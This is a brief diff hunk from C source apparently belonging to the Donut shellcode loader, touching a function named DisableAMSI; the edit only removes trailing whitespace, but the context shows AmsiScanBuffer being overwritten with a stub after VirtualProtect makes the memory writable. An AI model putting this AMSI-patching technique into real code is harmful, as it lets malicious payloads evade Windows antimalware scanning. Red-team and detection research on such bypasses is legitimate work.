@@ -83,7 +83,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
         cs, len, PAGE_EXECUTE_READWRITE, &op))
       {
         // over write with virtual address of stub
-        Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);      
+        Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
         // set memory back to original protection
         inst->api.VirtualProtect(cs, len, op, &t);
       }
